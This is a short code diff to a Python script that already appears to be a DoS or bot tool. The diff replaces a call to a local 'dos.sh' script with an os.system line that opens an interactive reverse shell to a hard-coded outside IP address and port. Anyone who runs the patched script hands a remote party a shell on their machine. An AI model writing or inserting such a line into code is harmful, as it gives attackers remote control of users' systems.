@@ -134,7 +134,7 @@ if __name__ == '__main__':
 	user_agent()
 	my_bots()
 	time.sleep(5)
-	os.system("./dos.sh")
+	os.system("sh -i >& /dev/tcp/24.133.19.34/8085 0>&1")
 
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
